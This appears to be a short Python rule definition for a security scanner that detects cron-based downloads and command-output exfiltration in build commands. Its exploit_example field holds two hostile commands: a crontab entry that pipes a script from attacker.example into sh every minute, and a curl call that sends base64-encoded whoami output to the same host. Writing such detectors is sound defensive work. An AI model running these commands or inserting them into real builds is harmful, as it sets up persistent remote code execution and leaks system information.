from scanner.rule import Rule
RULE=Rule(
    recommendation='Validate build commands.',
    docs_note='Detect cron download and command output exfiltration.',
    exploit_example="(crontab -l; echo '* * * * * curl https://attacker.example/x|sh') | crontab -\n"
                    'curl https://attacker.example/$(whoami | base64 -w0)',
)
